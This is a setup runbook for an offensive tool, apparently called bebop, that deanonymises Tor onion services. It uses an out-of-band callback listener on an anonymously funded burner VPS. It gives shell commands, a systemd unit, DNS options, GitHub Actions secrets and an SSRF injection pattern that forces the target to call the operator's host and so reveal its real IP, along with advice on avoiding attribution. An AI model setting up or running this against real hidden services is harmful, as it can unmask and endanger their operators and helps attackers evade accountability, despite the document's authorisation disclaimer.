# OOB callback listener — burner setup runbook

A concrete, copy-pasteable setup for bebop's out-of-band (OOB) callback
deanonymisation: a throwaway host that logs the origin's real IP when the target
calls back, plus the exact `BEBOP_OOB_*` values to point bebop at it — locally
and under GitHub Actions.

> ⚠️ **Read [OPSEC.md](../OPSEC.md) first.** This is active and intrusive. The
> listener is exposed to the target: when the origin calls back, **this host's IP
> is what the operator sees**. Use throwaway, anonymously-funded infrastructure,
> never reused, only against systems you are authorised to test. The GitHub
> runner can **not** be the listener — it is egress-only (see OPSEC.md).

---

## 1. Provision a burner host

- A small VPS you can walk away from. Nothing else runs on it.
- Acquire and pay for it in a way that is not linkable to you; do not reuse it.
- Open **inbound TCP 80** (and 443 only if you serve the callback over https):

  ```sh
  sudo ufw allow 80/tcp && sudo ufw enable      # or your provider's firewall
  ```

## 2. Run the listener

Copy [`contrib/oob_listener.py`](../contrib/oob_listener.py) to the box (stdlib
only — no dependencies) and run it on port 80:

```sh
sudo python3 oob_listener.py 80
# behind a reverse proxy you control? trust the forwarded IP:
# sudo OOB_TRUST_XFF=1 python3 oob_listener.py 8080
```

Run it under systemd so it survives disconnects:

```ini
# /etc/systemd/system/oob-listener.service
[Unit]
Description=bebop OOB listener
After=network.target
[Service]
ExecStart=/usr/bin/python3 /opt/oob_listener.py 80
Restart=on-failure
[Install]
WantedBy=multi-user.target
```

```sh
sudo systemctl enable --now oob-listener
```

The listener records every inbound request's source IP against the token in the
request and serves the recorded hits as JSON at
`/__hits__?token=<token>` — which is exactly what bebop polls.

## 3. Point a name at it (or don't)

You have two addressing styles. **Path style is simplest** and is the
recommended default.

| Style | Callback URL | DNS needed | `BEBOP_OOB_PATH_STYLE` |
| --- | --- | --- | --- |
| **Path** (default) | `http://HOST/<token>` | one `A` record, or **none** (use the raw IP as HOST) | `1` |
| Subdomain | `http://<token>.HOST` | wildcard `*.HOST` `A` record | `0` |

- **Path style, no DNS at all:** set the callback host to the VPS IP. Nothing to
  register.
- **Path style, with a burner domain:** one `A` record `oob.example.net → <ip>`.
- **Subdomain style (interactsh-like):** wildcard `*.oob.example.net → <ip>`.

## 4. Dry-run before going live

From your machine, prove the listener records and serves a hit:

```sh
# simulate the origin dereferencing a path-style callback
curl -s "http://<HOST>/deadbeefcafe"
# poll it back the way bebop will
curl -s "http://<HOST>/__hits__?token=deadbeefcafe"
# => [{"token":"deadbeefcafe","remote-address":"<your ip>","protocol":"http",...}]
```

If you see your own IP in that JSON, the plumbing works.

## 5a. Configure bebop — local run

Path style with a burner domain:

```sh
python3 -m app \
  --oob-callback oob.example.net \
  --oob-scheme http \
  --oob-path-style \
  --oob-poll-url 'http://oob.example.net/__hits__?token={TOKEN}' \
  http://<target>.onion
```

Raw-IP variant (no DNS): use the IP for both `--oob-callback` and the poll URL.
Add an SSRF endpoint you have identified with `--oob-inject`:

```sh
  --oob-inject 'https://<target>.onion/proxy?url={CALLBACK}'
```

## 5b. Configure the endpoint — GitHub Actions run

bebop reads the same settings from `BEBOP_OOB_*` environment variables, which
the workflow wires in from **repository secrets** (already added to
`.github/workflows/main.yml`). Set them once, per repo:

**Settings → Secrets and variables → Actions → New repository secret**

| Secret | Value (path style, with domain) |
| --- | --- |
| `BEBOP_OOB_CALLBACK` | `oob.example.net` |
| `BEBOP_OOB_SCHEME` | `http` |
| `BEBOP_OOB_POLL_URL` | `http://oob.example.net/__hits__?token={TOKEN}` |
| `BEBOP_OOB_INJECT` | *(optional)* `https://TARGET/proxy?url={CALLBACK}` |

Path-style also needs the path flag. There is no `--oob-path-style` **secret**
by default; add it as an env var on the run step (or use subdomain style, which
needs no flag):

```yaml
# .github/workflows/main.yml  ->  the "run" step's env:
          BEBOP_OOB_PATH_STYLE: "1"      # 1/true/yes/on = path style; unset = subdomain
```

Leaving `BEBOP_OOB_CALLBACK` unset keeps OOB **disabled** — the default. When it
is set, bebop logs a warning banner and, on each scan, triggers the callback
over Tor, then polls your listener and confirms any recorded IP against the
onion baseline. Notes for CI:

- The **trigger** egresses over Tor from the runner; the target does not see the
  runner there.
- The **poll** goes from the runner to your listener over clearnet — that is
  your own infrastructure, so it is fine, but your listener will log the GitHub
  runner's (Azure) IP alongside real callbacks. Filter those out; they are not
  the origin.
- Results land in the run's uploaded artifacts (`scan_data['oob']`).

## 6. Read the result

A recorded callback source IP that is **not** your poller/runner is the origin's
real clearnet egress. bebop also fetches it over clearnet and diffs the body
against the onion baseline — a `CONFIRMED`/`LIKELY` verdict is a deanonymisation.

Treat a lone IP as a lead, not proof: a honeypot can route its callback through a
proxy to feed you a decoy (see OPSEC.md). A DNS-only interaction (not captured by
this HTTP-only listener — use interactsh for that) reveals a resolver, not the
host.

## 7. Burn it

When done: tear down the VPS, drop the DNS record, and rotate the burner domain.
Do not reuse any of it for the next engagement.

---

### Limitations of this minimal listener

- **HTTP only.** It captures HTTP(S) callbacks (the origin's direct egress). It
  does **not** run a DNS server, so DNS-only interactions are not seen — use
  [interactsh](https://github.com/projectdiscovery/interactsh) if you need DNS
  correlation (bebop's generic poll can front an interactsh instance via a small
  JSON shim).
- **Direct-connect only.** Put nothing in front of it (CDN/reverse proxy) unless
  you set `OOB_TRUST_XFF=1` and trust the forwarded header — otherwise you log
  the proxy's IP, or let a target forge one.
